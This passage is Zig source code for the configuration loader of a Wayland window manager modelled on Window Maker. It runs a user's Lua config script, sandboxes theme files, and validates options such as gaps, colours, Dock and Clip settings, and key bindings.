// SPDX-License-Identifier: 0BSD
//
// Configuration for wmaker-wl.
//
// This is the single source of truth for every tunable. Nothing else in
// the code base may hard-code a gap, border, colour or command.
//
// File: $XDG_CONFIG_HOME/wmaker-wl/config.lua
//       (falls back to ~/.config/wmaker-wl/config.lua)
//
// Format: a plain Lua script (Lua 5.4, built in through ziglua, see lua.zig). Options are
// global variables, key bindings and other files are function calls:
//
//     gap = 10
//     border_focused = "#d8a657"            -- or 0xd8a657
//     terminal = "alacritty --class foo"    -- or { "alacritty", "--class", "foo" }
//     bind("Super+Shift+h", "move_column_left")
//     bind("Super+Return", "spawn alacritty --class foo")
//     unbind("Super+q")
//
// The script runs on top of the built-in share/default_config.lua: whatever
// it does not set keeps the default. Being a real script it can also loop,
// compute and read the environment:
//
//     for i = 1, 9 do bind("Super+" .. i, "workspace " .. i) end
//
// Nothing in it can stop the session from starting: a Lua error, an unknown
// option or a bad value is a warning in the log (and counted in
// `parse_warnings`). A bad value is refused and the previous one stays; an
// error in the script ends the script at that point, what ran before it
// stays. Every global the script creates is an option: an unknown name
// (`gapp = 8`) is reported, so typos do not go unnoticed. Helpers should be
// `local`, or start with `_`, to stay out of that check. A script that runs
// for far too long (endless loop) is aborted.
//
// Key names are resolved through xkbcommon, so they are layout-correct.
// River matches bindings against the *active* layout; no manual QWERTZ /
// AZERTY remapping is needed (the old layoutMapKeysym() was wrong).
//
// A key can be named by its keysym (`Return`, `udiaeresis`, `U00FC`) or, for
// a single character, by that character itself (`Super+ü`, `Super+ß`) --
// handy on a German layout, where the key labelled ü has no ASCII name.
//
// `include("FILE")` runs another file at that point, in the same script
// (so later lines override it); `theme("NAME")` reads Themes/NAME.lua,
// restricted to the look options (colours, border width, gaps) and run with
// an EMPTY environment -- a theme sees no function at all, so it can never
// bind a key, start a program or touch a file. See `themeInto`.
//
// By default a binding is translated with whichever layout is active at the
// moment. `bind_layout = 0` (or 1, 2, 3) pins all bindings to that layout of
// the keyboard instead, so a binding written as `Super+q` keeps working
// after switching from `us` to `de` and back (river_xkb_binding_v1.
// set_layout_override). `bind_layout = "current"` follows the active one.

const std = @import("std");
const wayland = @import("wayland");
const xkb = @import("xkbcommon");
const scale = @import("scale.zig");
const river = wayland.client.river;

pub const Modifiers = river.SeatV1.Modifiers;

pub const Bind = struct {
    mods: Modifiers,
    keysym: u32,
    /// Raw command text, e.g. "focus_left" or "workspace 2". Parsed by
    /// action.parse() so config.zig stays independent of action.zig.
    command: []const u8,
};

pub const CenterMode = enum {
    /// Scroll the minimum amount that brings the focused column into view.
    on_overflow,
    /// Always keep the focused column centred.
    always,
    /// Never scroll on focus change.
    never,
};

pub const NewWindowMode = enum {
    /// Open new windows in a fresh column right of the focused one.
    new_column,
    /// Stack new windows into the focused column.
    stack,
};

/// Which screen edge the Dock (Window Maker's WMDock) sits on.
pub const DockEdge = enum { left, right };

/// Which screen corner the Clip (Window Maker's WMClip) sits in.
pub const ClipCorner = enum { top_left, top_right, bottom_left, bottom_right };

/// Where a submenu opens relative to its parent menu.
pub const SubmenuAlign = enum { right, left };

/// Longest Pango font description accepted for the `font_*` options.
pub const max_font_len = 63;

/// Hard upper bound; Output holds workspaces in a fixed array.
pub const max_workspaces = 16;

/// Upper bound for every pixel-valued option (gaps, border, sizes, offsets).
/// The layout multiplies and sums these per column and window; an absurd
/// value such as `gap = 2000000000` would overflow `i32` there and crash the
/// window manager, so it is refused when the file is read instead.
pub const max_pixels: i32 = 10_000;
/// Allowed range of `dock_size` (px per tile).
pub const min_dock_size: i32 = scale.min_side;
pub const max_dock_size: i32 = scale.max_side;

/// xkbcommon allows at most four layouts per keymap.
pub const max_bind_layouts = 4;

/// Dock/Clip options that the saved Dock state (WMState, see wm_files.zig)
/// can also set. `true` = the user's own config.lua names the option, and
/// then the config wins over the saved state; an option the user never wrote
/// down is taken from the saved state (what was last changed with the mouse).
/// The built-in defaults never count as "written down".
pub const Explicit = struct {
    dock_edge: bool = false,
    dock_offset: bool = false,
    dock_on_top: bool = false,
    dock_auto_raise: bool = false,
    clip_corner: bool = false,
    clip_on_top: bool = false,
    clip_collapsed: bool = false,
    clip_auto_collapse: bool = false,
    clip_auto_raise: bool = false,
};

pub const Config = struct {
    arena: std.heap.ArenaAllocator,
    config_file: []const u8 = "(built-in defaults)",
    /// Which Dock/Clip options config.lua sets itself, see `Explicit`.
    explicit: Explicit = .{},

    // ---- layout ---------------------------------------------------------
    gap: i32 = 8,
    outer_gap: i32 = 8,
    default_column_width: f64 = 0.5,
    width_presets: []const f64 = &.{ 1.0 / 3.0, 0.5, 2.0 / 3.0, 1.0 },
    width_step: f64 = 0.1,
    min_window_size: i32 = 120,
    center_focused_column: CenterMode = .on_overflow,
    new_window: NewWindowMode = .new_column,

    // ---- look -----------------------------------------------------------
    border_width: i32 = 2,
    border_focused: u32 = 0xd8a657,
    border_unfocused: u32 = 0x3c3836,
    border_floating: u32 = 0x7daea3,

    // ---- fonts (Pango font descriptions, e.g. "Sans Bold 10") --------------
    /// Title bar of a menu.
    font_menu_title: [:0]const u8 = "Sans Bold 10",
    /// Rows of a menu.
    font_menu: [:0]const u8 = "Sans 10",
    /// The small workspace name under the number in the Clip.
    font_dock: [:0]const u8 = "Sans 8",

    // ---- menus ----------------------------------------------------------
    /// Which side of its parent a submenu opens on first. It flips to the
    /// other side when it would leave the screen.
    // TODO: parsed and editable in wlprefs, but ui.zig does not read it yet.
    menu_submenu_align: SubmenuAlign = .right,

    // ---- windows / focus --------------------------------------------------
    /// A new window takes the keyboard focus (and the view scrolls to it).
    /// false: it opens in the background and the focus stays where it is.
    focus_new_windows: bool = true,

    // ---- workspaces -----------------------------------------------------
    workspace_count: u32 = 4,
    /// workspace_next on the last workspace goes to the first, and
    /// workspace_prev on the first goes to the last. false: they stop.
    workspace_wrap: bool = true,
    /// The mouse wheel over the Clip switches workspace.
    clip_scroll_workspaces: bool = true,

    // ---- floating / mouse -----------------------------------------------
    /// Pixels a tiled window must be dragged before it detaches into the
    /// floating layer. Prevents an accidental click-drag from wrecking
    /// the layout.
    drag_threshold: i32 = 24,
    /// Size of a fresh floating window as a fraction of the output.
    floating_size: f64 = 0.6,
    focus_follows_mouse: bool = false,
    /// Modifier for mouse move/resize (Mod+LMB / Mod+RMB).
    mouse_mod: Modifiers = .{ .mod4 = true },

    // ---- programs -------------------------------------------------------
    terminal: []const []const u8 = &.{"alacritty"},
    launcher: []const []const u8 = &.{"fuzzel"},
    browser: []const []const u8 = &.{"firefox"},

    // ---- key bindings ---------------------------------------------------
    binds: []const Bind = &.{},

    // ---- WindowMaker compatibility --------------------------------------
    /// Also read Window Maker's own files (~/GNUstep/Defaults/WMRootMenu,
    /// WMWindowAttributes, ...). Files in ~/.config/wmaker-wl always win.
    enable_wmaker_compat: bool = true,

    // ---- session ----------------------------------------------------------
    /// Run the autostart script once when the session comes up, exactly
    /// like Window Maker: ~/.config/wmaker-wl/autostart, falling back to
    /// ~/GNUstep/Library/WindowMaker/autostart when enable_wmaker_compat
    /// allows it. Neither needs to exist; a missing script is a no-op.
    enable_autostart: bool = true,

    /// Problems found while reading the config (Lua error, unknown option,
    /// bad value, missing include, a theme using an option themes may not
    /// use). The shipped files are tested to have none.
    parse_warnings: u32 = 0,

    // ---- keyboard -------------------------------------------------------------
    /// null: bindings follow the active xkb layout. N: always translate key
    /// events with layout N (0-based) of the keyboard that produced them.
    bind_layout: ?u32 = null,

    // ---- Dock and Clip (see dock.zig) -------------------------------------------
    /// Draw the Dock: a column of 64 px tiles on one screen edge. Its first
    /// tile is the Window Maker logo tile, the others are the DockApps of
    /// WMState.
    dock_enabled: bool = true,
    /// Edge length of one Dock/Clip tile in px (Window Maker's icon size,
    /// default 64). The icon inside is 3/4 of it.
    dock_size: i32 = 64,
    dock_edge: DockEdge = .right,
    /// Distance of the Dock's top edge from the top of the screen, in px.
    dock_offset: i32 = 0,
    /// true: the Dock is drawn above windows (Window Maker's "Keep on top");
    /// false: below them ("Lowered").
    dock_on_top: bool = true,
    /// Window Maker's "Auto raise & lower" (Dock position menu): only
    /// counts while `dock_on_top` is off. The Dock then sits below windows
    /// and comes up while the pointer is on it. (The Dock menu sets the level at
    /// run time; it is saved in WMState.)
    dock_auto_raise: bool = false,
    /// Launch with ONE click on a Dock/Clip tile. Window Maker's default is
    /// a double click (a single click only raises the Dock), which is also
    /// the default here.
    dock_single_click: bool = false,
    /// Save moved/added/removed tiles and the Dock/Clip switches to the
    /// state file (see docs/DOCKAPPS.md) and read it back at start-up.
    dock_save_state: bool = true,
    /// Shrink the usable area by the Dock's width so tiled windows never end
    /// up under it. Ignored while the Dock is lowered.
    dock_reserve_space: bool = true,
    /// Draw the Clip: one tile with workspace arrows plus the DockApps whose
    /// `place = clip` belongs to the current workspace.
    clip_enabled: bool = true,
    clip_corner: ClipCorner = .top_left,
    clip_on_top: bool = true,
    /// Start with only the Clip tile shown, without its workspace icons.
    clip_collapsed: bool = false,
    /// Window Maker's "Autocollapse": the Clip folds up when the pointer
    /// leaves it and unfolds when it comes back. (No delay: wmaker-wl has no
    /// timers.)
    clip_auto_collapse: bool = false,
    /// Window Maker's "Autoraise": a Clip that is not `clip_on_top` comes up
    /// while the pointer is on it.
    clip_auto_raise: bool = false,
    /// Workspace names, in order. Missing/empty entries are shown as just
    /// the workspace number. Without this option the names of Window
    /// Maker's WMState (if read) are used.
    workspace_names: []const []const u8 = &.{},

    // ---- dock apps ----------------------------------------------------------
    /// Run every `autolaunch = yes` DockApp once when the session comes up
    /// (see dockapp.zig). Looked up first as
    /// $XDG_STATE_HOME/wmaker-wl/WMState, then (if enable_wmaker_compat
    /// allows it) parsed out of Window Maker's own
    /// ~/GNUstep/Defaults/WMState. Neither needs to exist.
    enable_dockapps: bool = true,

    pub fn deinit(cfg: *Config) void {
        cfg.arena.deinit();
    }
};

const lua = @import("lua.zig");

const default_config_text = @embedFile("share/default_config.lua");

/// Load configuration. Only fails on out-of-memory: a broken or missing
/// user file falls back to the built-in defaults (with warnings), so the
/// session always starts.
pub fn load(io: std.Io, gpa: std.mem.Allocator) !Config {
    var cfg: Config = .{ .arena = .init(gpa) };
    errdefer cfg.deinit();
    const a = cfg.arena.allocator();

    var binds: std.ArrayList(Bind) = .empty;
    try parse(a, default_config_text, &cfg, &binds, "<built-in>");
    cfg.parse_warnings = 0; // the built-in file is tested; only the user's count

    if (try userConfigPath(a)) |path| {
        if (std.Io.Dir.readFileAlloc(std.Io.Dir.cwd(), io, path, a, .limited(1 << 20))) |text| {
            cfg.config_file = path;
            var reader: FileReader = .{ .io = io };
            const inc: Includer = .{
                .ctx = &reader,
                .read = FileReader.read,
                .dir = std.fs.path.dirname(path) orelse ".",
            };
            try parseWith(a, text, &cfg, &binds, path, &inc, false);
        } else |err| {
            std.log.info("no user config at {s} ({t}); using defaults", .{ path, err });
        }
        warnLegacyConfig(io, a, path);
    }

    cfg.binds = try binds.toOwnedSlice(a);
    return cfg;
}

/// Before the move to Lua the file was `config.conf` (`key = value` lines).
/// It is not read any more (and neither does anything else pick it up), so
/// say so instead of silently ignoring a file the user, or an older wlprefs,
/// wrote: that looks exactly like "my config is not loaded".
fn warnLegacyConfig(io: std.Io, a: std.mem.Allocator, lua_path: []const u8) void {
    const dir = std.fs.path.dirname(lua_path) orelse return;
    const old = std.fmt.allocPrint(a, "{s}/config.conf", .{dir}) catch return;
    if (std.Io.Dir.readFileAlloc(std.Io.Dir.cwd(), io, old, a, .limited(1 << 20))) |_| {
        std.log.warn("{s} is NOT read any more: the config is now {s} (Lua, see share/default_config.lua)", .{ old, lua_path });
    } else |_| {}
}

fn userConfigPath(a: std.mem.Allocator) !?[]const u8 {
    if (std.c.getenv("XDG_CONFIG_HOME")) |x| {
        const dir = std.mem.span(x);
        if (dir.len > 0) return try std.fmt.allocPrint(a, "{s}/wmaker-wl/config.lua", .{dir});
    }
    if (std.c.getenv("HOME")) |h| {
        return try std.fmt.allocPrint(a, "{s}/.config/wmaker-wl/config.lua", .{std.mem.span(h)});
    }
    return null;
}

// ----------------------------------------------------------------------------
// Running the script
// ----------------------------------------------------------------------------

/// Reads the files `include`/`theme` name. A callback so that parsing stays
/// free of file-system access (and testable with a map of fake files).
pub const Includer = struct {
    ctx: *anyopaque,
    /// The contents of `path` (allocated in `a`), or null if it cannot be
    /// read.
    read: *const fn (ctx: *anyopaque, a: std.mem.Allocator, path: []const u8) ?[]const u8,
    /// Directory of the file being parsed: relative includes and Themes/
    /// are looked up from here.
    dir: []const u8,
    depth: u8 = 0,
};

pub const max_include_depth = 4;

/// VM instructions a script may execute before it is aborted. A real config
/// needs a few thousand; this only exists so that an endless loop cannot
/// hang the session (about a second of Lua).
const max_script_instructions = 50_000_000;

/// Where a theme is looked for besides next to the config.
const theme_dirs = [_][]const u8{ "/usr/local/share/wmaker-wl/Themes", "/usr/share/wmaker-wl/Themes" };

/// The options a theme may set: how things look, nothing that does anything.
fn themeKey(key: []const u8) bool {
    inline for (.{ "gap", "outer_gap", "border_width", "border_focused", "border_unfocused", "border_floating" }) |k| {
        if (std.mem.eql(u8, key, k)) return true;
    }
    return false;
}

const FileReader = struct {
    io: std.Io,

    fn read(ctx: *anyopaque, a: std.mem.Allocator, path: []const u8) ?[]const u8 {
        const self: *FileReader = @ptrCast(@alignCast(ctx));
        return std.Io.Dir.readFileAlloc(std.Io.Dir.cwd(), self.io, path, a, .limited(1 << 20)) catch null;
    }
};

/// A theme name is a file name: letters, digits, `_`, `-`, `.`; never a path.
pub fn validThemeName(name: []const u8) bool {
    if (name.len == 0 or name.len > 64 or name[0] == '.') return false;
    for (name) |ch| {
        if (!std.ascii.isAlphanumeric(ch) and ch != '_' and ch != '-' and ch != '.') return false;
    }
    return std.mem.indexOf(u8, name, "..") == null;
}

/// Everything one run of a config script needs. The Lua callbacks (bind,
/// include, ...) are plain C functions without user data, so the run in
/// progress is reached through `active`.
const Ctx = struct {
    L: *lua.State,
    a: std.mem.Allocator,
    cfg: *Config,
    binds: *std.ArrayList(Bind),
    /// Name used in messages about the whole script (not about one line).
    origin: []const u8,
    inc: ?*const Includer,
    /// Directory of the file being run: relative includes and Themes/ start here.
    dir: []const u8,
    depth: u8,
    /// The script is the user's own (not the built-in defaults): the Dock/Clip
    /// options it names count as written down, see `Explicit`.
    user_script: bool,
    /// An allocation failed inside a Lua callback (which cannot return an
    /// error); parseWith reports it when the script is done.
    oom: bool = false,

    fn warn(ctx: *Ctx, comptime fmt: []const u8, args: anytype) void {
        std.log.warn(fmt, args);
        ctx.cfg.parse_warnings += 1;
    }

    /// A warning with the "file:line:" of the Lua code that made the call.
    fn warnAt(ctx: *Ctx, comptime fmt: []const u8, args: anytype) void {
        var buf: [512]u8 = undefined;
        const msg = std.fmt.bufPrint(&buf, fmt, args) catch "(message too long)";
        const loc = lua.where(ctx.L);
        std.log.warn("{s}{s}", .{ loc, msg });
        lua.pop(ctx.L, 1);
        ctx.cfg.parse_warnings += 1;
    }

    fn print(ctx: *Ctx, comptime fmt: []const u8, args: anytype) ?[]u8 {
        return std.fmt.allocPrint(ctx.a, fmt, args) catch {
            ctx.oom = true;
            return null;
        };
    }
};

threadlocal var active: ?*Ctx = null;

const StringSet = std.StringHashMapUnmanaged(void);

pub fn parse(
    a: std.mem.Allocator,
    text: []const u8,
    cfg: *Config,
    binds: *std.ArrayList(Bind),
    origin: []const u8,
) !void {
    return parseWith(a, text, cfg, binds, origin, null, false);
}

/// Run the Lua script `text` and apply what it set to `cfg` / `binds`.
///
/// `inc` null: `include`/`theme` are refused (a warning). `theme_only`: the
/// text comes from a theme, so it runs with an empty environment and only
/// look options are accepted.
pub fn parseWith(
    a: std.mem.Allocator,
    text: []const u8,
    cfg: *Config,
    binds: *std.ArrayList(Bind),
    origin: []const u8,
    inc: ?*const Includer,
    theme_only: bool,
) std.mem.Allocator.Error!void {
    const L = lua.newState() orelse return error.OutOfMemory;
    defer lua.close(L);
    lua.limitInstructions(L, max_script_instructions);

    var ctx: Ctx = .{
        .L = L,
        .a = a,
        .cfg = cfg,
        .binds = binds,
        .origin = origin,
        .inc = inc,
        .dir = if (inc) |i| i.dir else ".",
        .depth = if (inc) |i| i.depth else 0,
        .user_script = origin.len > 0 and origin[0] != '<',
    };
    const outer = active;
    active = &ctx;
    defer active = outer;

    // Names that exist before the script runs (the standard library and our
    // functions): everything else the script creates is an option.
    var baseline: StringSet = .empty;

    if (theme_only) {
        themeInto(&ctx, text, origin);
    } else {
        lua.openLibs(L);
        lua.harden(L);
        lua.register(L, "bind", cBind);
        lua.register(L, "unbind", cUnbind);
        lua.register(L, "include", cInclude);
        lua.register(L, "theme", cTheme);
        try snapshotGlobals(&ctx, &baseline);
        runChunk(&ctx, text, origin);
    }

    try applyGlobals(&ctx, &baseline);
    if (ctx.oom) return error.OutOfMemory;
}

/// Chunk name for messages: "@file" shows as "file:LINE:", "=<name>" as is.
fn chunkName(ctx: *Ctx, origin: []const u8) ?[:0]const u8 {
    const prefix: u8 = if (origin.len > 0 and origin[0] == '<') '=' else '@';
    const name = std.fmt.allocPrintSentinel(ctx.a, "{c}{s}", .{ prefix, origin }, 0) catch {
        ctx.oom = true;
        return null;
    };
    return name;
}

/// The error message on top of the Lua stack becomes a warning.
fn luaFailed(ctx: *Ctx) void {
    const msg = lua.toSlice(ctx.L, -1) orelse "(error object is not a string)";
    ctx.warn("{s}", .{msg});
    lua.pop(ctx.L, 1);
}

/// Run `text` in the script's own environment. The stack stays balanced.
fn runChunk(ctx: *Ctx, raw_text: []const u8, origin: []const u8) void {
    const name = chunkName(ctx, origin) orelse return;
    // Editors on other systems like to start a file with a UTF-8 byte order
    // mark; Lua's loader for strings (unlike its file loader) chokes on it.
    const text = if (std.mem.startsWith(u8, raw_text, "\xEF\xBB\xBF")) raw_text[3..] else raw_text;
    if (!lua.load(ctx.L, text, name)) return luaFailed(ctx);
    if (!lua.call(ctx.L)) luaFailed(ctx);
}

/// Run a theme with an EMPTY environment (a fresh table: no `print`, no
/// `os`, not even `bind`), then copy the look options it set into the
/// script's globals, where later lines of the script override them and
/// earlier ones are overridden. Anything else it set is a warning. A theme
/// that fails halfway is dropped as a whole.
fn themeInto(ctx: *Ctx, text: []const u8, origin: []const u8) void {
    const L = ctx.L;
    const name = chunkName(ctx, origin) orelse return;

    lua.newTable(L); //                              [env]
    if (!lua.load(L, text, name)) { //               [env, func] / [env, msg]
        luaFailed(ctx);
        lua.pop(L, 1);
        return;
    }
    lua.pushValue(L, -2); //                         [env, func, env]
    if (!lua.setEnv(L, -2)) { //                     [env, func]
        lua.pop(L, 3);
        return;
    }
    if (!lua.call(L)) { //                           [env] / [env, msg]
        luaFailed(ctx);
        lua.pop(L, 1);
        return;
    }

    lua.pushNil(L);
    while (lua.next(L, -2)) { //                     [env, key, value]
        copyThemeEntry(ctx, origin);
        lua.pop(L, 1);
    }
    lua.pop(L, 1); //                                []
}

/// Stack: [.., key, value]. Leaves it as it found it.
fn copyThemeEntry(ctx: *Ctx, origin: []const u8) void {
    const L = ctx.L;
    const key = lua.toSlice(L, -2) orelse {
        ctx.warn("{s}: a theme sets named options only", .{origin});
        return;
    };
    if (!themeKey(key)) {
        ctx.warn("{s}: `{s}` is not a theme option (themes set colours, borders and gaps only)", .{ origin, key });
        return;
    }
    lua.pushGlobals(L); //       [key, value, G]
    lua.pushValue(L, -3); //     [key, value, G, key]
    lua.pushValue(L, -3); //     [key, value, G, key, value]
    lua.rawSet(L, -3); //        G[key] = value        [key, value, G]
    lua.pop(L, 1);
}

// ---- the functions a script can call ---------------------------------------
//
// They never raise a Lua error (that would longjmp across Zig frames): a
// problem is a warning with the script's file and line, and the call is a
// no-op.

fn cBind(L: *lua.State) i32 {
    const ctx = active orelse return 0;
    const combo = lua.toSlice(L, 1);
    const command = lua.toSlice(L, 2);
    if (combo == null or command == null) {
        ctx.warnAt("bind() takes two strings: bind(\"Super+q\", \"close\")", .{});
        return 0;
    }
    addBind(ctx.a, ctx.binds, combo.?, command.?) catch |err| switch (err) {
        error.OutOfMemory => ctx.oom = true,
        error.Invalid => ctx.warnAt("bad bind: `{s}`, `{s}`", .{ combo.?, command.? }),
    };
    return 0;
}

fn cUnbind(L: *lua.State) i32 {
    const ctx = active orelse return 0;
    const combo = lua.toSlice(L, 1) orelse {
        ctx.warnAt("unbind() takes one string: unbind(\"Super+q\")", .{});
        return 0;
    };
    removeBind(ctx.binds, combo) catch ctx.warnAt("bad key combination for unbind: `{s}`", .{combo});
    return 0;
}

fn cInclude(L: *lua.State) i32 {
    const ctx = active orelse return 0;
    const value = lua.toSlice(L, 1) orelse {
        ctx.warnAt("include() takes a file name: include(\"local.lua\")", .{});
        return 0;
    };
    includeFile(ctx, value, false);
    return 0;
}

fn cTheme(L: *lua.State) i32 {
    const ctx = active orelse return 0;
    const value = lua.toSlice(L, 1) orelse {
        ctx.warnAt("theme() takes a theme name: theme(\"nord\")", .{});
        return 0;
    };
    includeFile(ctx, value, true);
    return 0;
}

fn includeFile(ctx: *Ctx, value: []const u8, is_theme: bool) void {
    const what: []const u8 = if (is_theme) "theme" else "include";
    const i = ctx.inc orelse {
        ctx.warnAt("`{s}` is not available here", .{what});
        return;
    };
    if (ctx.depth >= max_include_depth) {
        ctx.warnAt("`{s}` nested too deep (limit {d})", .{ what, max_include_depth });
        return;
    }
    if (value.len == 0) {
        ctx.warnAt("`{s}` needs a value", .{what});
        return;
    }

    var found_path: ?[]const u8 = null;
    var text: ?[]const u8 = null;

    if (is_theme) {
        if (!validThemeName(value)) {
            ctx.warnAt("`{s}` is not a theme name", .{value});
            return;
        }
        const first = ctx.print("{s}/Themes/{s}.lua", .{ ctx.dir, value }) orelse return;
        if (i.read(i.ctx, ctx.a, first)) |t| {
            found_path = first;
            text = t;
        } else for (theme_dirs) |d| {
            const p = ctx.print("{s}/{s}.lua", .{ d, value }) orelse return;
            if (i.read(i.ctx, ctx.a, p)) |t| {
                found_path = p;
                text = t;
                break;
            }
        }
    } else {
        const p = if (std.mem.startsWith(u8, value, "~/")) blk: {
            const home = std.c.getenv("HOME") orelse break :blk value;
            break :blk ctx.print("{s}{s}", .{ std.mem.span(home), value[1..] }) orelse return;
        } else if (std.fs.path.isAbsolute(value))
            value
        else
            ctx.print("{s}/{s}", .{ ctx.dir, value }) orelse return;
        if (i.read(i.ctx, ctx.a, p)) |t| {
            found_path = p;
            text = t;
        }
    }

    const path = found_path orelse {
        ctx.warnAt("cannot read {s} `{s}`", .{ what, value });
        return;
    };

    if (is_theme) {
        themeInto(ctx, text.?, path);
        return;
    }
    // The included file runs in the same script (same globals); relative
    // includes inside it start from its own directory.
    const saved_dir = ctx.dir;
    ctx.dir = std.fs.path.dirname(path) orelse ".";
    ctx.depth += 1;
    runChunk(ctx, text.?, path);
    ctx.depth -= 1;
    ctx.dir = saved_dir;
}

// ---- from globals to Config -------------------------------------------------

fn snapshotGlobals(ctx: *Ctx, set: *StringSet) std.mem.Allocator.Error!void {
    const L = ctx.L;
    lua.pushGlobals(L);
    lua.pushNil(L);
    while (lua.next(L, -2)) {
        if (lua.toSlice(L, -2)) |k| try set.put(ctx.a, try ctx.a.dupe(u8, k), {});
        lua.pop(L, 1);
    }
    lua.pop(L, 1);
}

/// Every global the script created is an option. Applied after the script
/// ran, so the last assignment to a name is the one that counts.
fn applyGlobals(ctx: *Ctx, baseline: *const StringSet) std.mem.Allocator.Error!void {
    const L = ctx.L;
    lua.pushGlobals(L);
    lua.pushNil(L);
    while (lua.next(L, -2)) { //  [G, key, value]
        try applyEntry(ctx, baseline);
        lua.pop(L, 1);
    }
    lua.pop(L, 1);
}

fn applyEntry(ctx: *Ctx, baseline: *const StringSet) std.mem.Allocator.Error!void {
    const L = ctx.L;
    const key = lua.toSlice(L, -2) orelse return;
    if (key.len == 0 or key[0] == '_' or baseline.contains(key)) return;
    if (applyOption(ctx, key)) {
        // Only an option that was actually applied counts as "named".
        if (ctx.user_script) markExplicit(ctx.cfg, key);
    } else |err| switch (err) {
        error.OutOfMemory => return error.OutOfMemory,
        error.UnknownKey => ctx.warn("{s}: unknown option `{s}`", .{ ctx.origin, key }),
        error.Invalid => ctx.warn("{s}: bad value for `{s}` (got a {s})", .{ ctx.origin, key, lua.typeName(L, -1) }),
    }
}

fn markExplicit(cfg: *Config, key: []const u8) void {
    inline for (@typeInfo(Explicit).@"struct".fields) |f| {
        if (std.mem.eql(u8, key, f.name)) @field(cfg.explicit, f.name) = true;
    }
}

const ParseError = error{ Invalid, UnknownKey, OutOfMemory };

/// Set the option `key` to the Lua value on top of the stack. Nothing is
/// changed unless the value is valid.
fn applyOption(ctx: *Ctx, key: []const u8) ParseError!void {
    const L = ctx.L;
    const a = ctx.a;
    const cfg = ctx.cfg;
    const eql = std.mem.eql;

    inline for (.{ "gap", "outer_gap", "border_width", "min_window_size", "drag_threshold", "dock_offset" }) |name| {
        if (eql(u8, key, name)) {
            const v = lua.toInteger(L, -1) orelse return error.Invalid;
            if (v < 0 or v > max_pixels) return error.Invalid;
            @field(cfg, name) = @intCast(v);
            return;
        }
    }

    if (eql(u8, key, "dock_size")) {
        const v = lua.toInteger(L, -1) orelse return error.Invalid;
        if (v < min_dock_size or v > max_dock_size) return error.Invalid;
        cfg.dock_size = @intCast(v);
        return;
    }

    inline for (.{ "default_column_width", "width_step", "floating_size" }) |name| {
        if (eql(u8, key, name)) {
            const v = lua.toNumber(L, -1) orelse return error.Invalid;
            if (!(v > 0 and v <= 1)) return error.Invalid;
            @field(cfg, name) = v;
            return;
        }
    }

    inline for (.{ "border_focused", "border_unfocused", "border_floating" }) |name| {
        if (eql(u8, key, name)) {
            @field(cfg, name) = colourValue(L) orelse return error.Invalid;
            return;
        }
    }

    inline for (.{
        "dock_enabled",
        "dock_on_top",
        "dock_auto_raise",
        "dock_single_click",
        "dock_save_state",
        "dock_reserve_space",
        "clip_enabled",
        "clip_on_top",
        "clip_collapsed",
        "clip_auto_collapse",
        "clip_auto_raise",
        "focus_new_windows",
        "workspace_wrap",
        "clip_scroll_workspaces",
        "focus_follows_mouse",
        "enable_wmaker_compat",
        "enable_autostart",
        "enable_dockapps",
    }) |name| {
        if (eql(u8, key, name)) {
            @field(cfg, name) = lua.toBool(L, -1) orelse return error.Invalid;
            return;
        }
    }

    inline for (.{ "center_focused_column", "new_window", "dock_edge", "clip_corner", "menu_submenu_align" }) |name| {
        if (eql(u8, key, name)) {
            const s = lua.toSlice(L, -1) orelse return error.Invalid;
            @field(cfg, name) = std.meta.stringToEnum(@TypeOf(@field(cfg, name)), s) orelse return error.Invalid;
            return;
        }
    }

    inline for (.{ "font_menu_title", "font_menu", "font_dock" }) |name| {
        if (eql(u8, key, name)) {
            const s = lua.toSlice(L, -1) orelse return error.Invalid;
            @field(cfg, name) = try parseFont(a, s);
            return;
        }
    }

    inline for (.{ "terminal", "launcher", "browser" }) |name| {
        if (eql(u8, key, name)) {
            @field(cfg, name) = try commandValue(ctx);
            return;
        }
    }

    if (eql(u8, key, "workspace_count")) {
        const v = lua.toInteger(L, -1) orelse return error.Invalid;
        if (v < 1 or v > max_workspaces) return error.Invalid;
        cfg.workspace_count = @intCast(v);
        return;
    }

    if (eql(u8, key, "width_presets")) {
        if (lua.typeOf(L, -1) != lua.T_TABLE) return error.Invalid;
        const n = lua.rawLen(L, -1);
        if (n == 0 or n > 64) return error.Invalid;
        var list: std.ArrayList(f64) = .empty;
        var i: usize = 1;
        while (i <= n) : (i += 1) {
            lua.rawGetI(L, -1, @intCast(i));
            const f = lua.toNumber(L, -1);
            lua.pop(L, 1);
            const v = f orelse return error.Invalid;
            if (!(v > 0 and v <= 1)) return error.Invalid;
            try list.append(a, v);
        }
        cfg.width_presets = try list.toOwnedSlice(a);
        return;
    }

    if (eql(u8, key, "workspace_names")) {
        // Empty entries (and holes) are kept: they mean "this workspace has
        // no name", so the names stay aligned with the workspace numbers.
        if (lua.typeOf(L, -1) != lua.T_TABLE) return error.Invalid;
        const n = lua.rawLen(L, -1);
        if (n > 256) return error.Invalid;
        var list: std.ArrayList([]const u8) = .empty;
        var i: usize = 1;
        while (i <= n) : (i += 1) {
            lua.rawGetI(L, -1, @intCast(i));
            const is_nil = lua.typeOf(L, -1) == lua.T_NIL;
            const s = lua.toSlice(L, -1);
            if (!is_nil and s == null) {
                lua.pop(L, 1);
                return error.Invalid;
            }
            const copy = try a.dupe(u8, s orelse "");
            lua.pop(L, 1);
            try list.append(a, copy);
        }
        cfg.workspace_names = try list.toOwnedSlice(a);
        return;
    }

    if (eql(u8, key, "bind_layout")) {
        if (lua.toInteger(L, -1)) |n| {
            if (n < 0 or n >= max_bind_layouts) return error.Invalid;
            const layout: u32 = @intCast(n);
            cfg.bind_layout = layout;
            return;
        }
        const s = lua.toSlice(L, -1) orelse return error.Invalid;
        if (!(eql(u8, s, "current") or eql(u8, s, "active"))) return error.Invalid;
        cfg.bind_layout = null;
        return;
    }

    if (eql(u8, key, "mouse_mod")) {
        const s = lua.toSlice(L, -1) orelse return error.Invalid;
        cfg.mouse_mod = parseMods(s) orelse return error.Invalid;
        return;
    }

    return error.UnknownKey;
}

/// A colour: `"#d8a657"`, `"d8a657"`, `"0xd8a657"` or the number `0xd8a657`.
fn colourValue(L: *lua.State) ?u32 {
    if (lua.toInteger(L, -1)) |n| {
        if (n < 0 or n > 0xffff_ffff) return null;
        const v: u32 = @intCast(n);
        return v;
    }
    const s = lua.toSlice(L, -1) orelse return null;
    var v = std.mem.trimStart(u8, s, "#");
    if (std.mem.startsWith(u8, v, "0x")) v = v[2..];
    return std.fmt.parseInt(u32, v, 16) catch null;
}

/// A command: a string, split like a command line ("foot -e \"htop -d 5\""),
